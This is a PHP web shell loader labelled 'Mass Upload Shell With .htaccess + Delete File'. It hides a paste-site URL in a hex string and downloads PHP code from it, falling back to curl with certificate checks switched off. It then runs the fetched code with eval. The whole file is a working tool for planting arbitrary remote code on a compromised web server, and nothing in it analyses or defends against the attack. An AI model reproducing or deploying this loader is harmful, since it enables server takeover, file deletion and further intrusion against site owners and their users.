<?php
#* Kitabisacom1337
#* Mass Upload Shell With .htaccess + Delete File
$kitabisacom1337 = '68747470733a2f2f70617374652e65652f722f533058506a2f30';

function inyourarea($hex) {
    return pack('H*', $hex);
}

$url = inyourarea($kitabisacom1337);

function download($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        return false;
    }
}

$phpScript = download($url);
if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL.");
}

eval('?>' . $phpScript);
?>
